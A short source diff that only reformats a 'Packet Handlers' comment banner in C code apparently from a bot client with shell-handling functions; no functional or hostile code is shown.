@@ -37,7 +37,7 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     }
 }
 
-/* ============================================[[ Packet Handlers ]]============================================= */
+/* ====================================[[ Packet Handlers ]]==================================== */
 
 void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
